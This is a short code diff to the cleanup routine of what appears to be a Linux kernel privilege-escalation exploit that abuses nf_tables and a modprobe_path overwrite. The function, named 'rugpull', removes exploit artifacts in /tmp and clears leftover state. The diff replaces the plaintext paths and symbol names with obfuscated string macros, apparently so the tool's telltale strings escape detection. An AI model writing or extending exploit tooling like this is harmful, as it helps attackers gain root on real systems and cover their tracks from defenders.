@@ -1,4 +1,5 @@
 #include "nfttables.h"
+#include "obf.h"
 
 int rugpull(void)
 {
@@ -10,9 +11,9 @@ int rugpull(void)
 
     /* remove exploit artifacts */
     const char *artifacts[] = {
-        "/tmp/.nft_mint",
-        "/tmp/.nft_sh",
-        "/tmp/.nft_trigger",
+        S(S_NFT_MINT),
+        S(S_NFT_SH),
+        S(S_NFT_TRIGGER),
         NULL,
     };
 
@@ -24,12 +25,13 @@ int rugpull(void)
     }
 
     /* try to restore modprobe_path if we have access */
-    uint64_t modprobe_addr = kallsyms_lookup("modprobe_path");
+    uint64_t modprobe_addr = kallsyms_lookup(S(S_MODPROBE_PATH));
     if (modprobe_addr && geteuid() == 0) {
         /* can't easily restore without the same PTE trick.
            log it as a known artifact. */
         pr_warn("modprobe_path was overwritten in kernel memory");
-        pr_info("  " C_DIM "restore: echo /sbin/modprobe > /proc/sys/kernel/modprobe" C_RST);
+        pr_info("  " C_DIM "restore: echo %s > %s" C_RST,
+                S(S_SBIN_MODPROBE), S(S_PROC_MODPROBE));
     }
 
     /* clear any message queues we left behind */
